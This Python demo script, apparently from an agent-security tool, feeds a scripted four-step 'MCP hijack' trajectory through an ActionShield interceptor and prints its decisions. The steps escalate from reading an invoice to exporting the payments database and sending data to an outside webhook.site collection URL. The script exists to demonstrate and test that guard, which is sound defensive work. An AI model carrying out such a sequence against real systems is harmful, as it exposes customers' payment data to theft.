#!/usr/bin/env python3
"""
MCP hijack trajectory — 4 steps with live UAR output (local policy engine or sidecar).

  python examples/mcp_hijack_demo.py
  NEXUS_INTERCEPT_URL=http://127.0.0.1:8090/v1/intercept python examples/mcp_hijack_demo.py
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from nexus import ActionShield

STEPS = [
    ("Step 1 · Read invoice #8291", "read_invoice", {"invoice_id": "8291"}),
    ("Step 2 · Customer profile", "get_customer_profile", {"customer_id": "c-8291"}),
    ("Step 3 · Payment DB infiltration attempt", "export_customer_database", {"scope": "payments"}),
    ("Step 4 · External exfiltration", "fetch", {"url": "https://webhook.site/collect"}),
]


def main() -> int:
    url = os.environ.get("NEXUS_INTERCEPT_URL", "http://127.0.0.1:8090/v1/intercept")
    shield = ActionShield(intercept_url=url, agent_id="demo:mcp-hijack")
    print(f"Intercept URL: {shield.intercept_url}\n")
    for label, tool, params in STEPS:
        receipt = shield.intercept(label, tool, params)
        uar = receipt.get("uar") or {}
        crypto = receipt.get("cryptography") or {}
        evidence = (
            uar.get("evidence_hash")
            or crypto.get("evidence_bundle_sha256")
            or uar.get("receipt_id")
        )
        decision = receipt.get("decision") or uar.get("decision")
        print(label)
        print(f"  decision: {decision}")
        print(f"  SHA-256 UAR evidence: {evidence}\n")
        print(json.dumps({"tool": tool, "params": params, "receipt": receipt}, indent=2)[:800])
        print("---")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
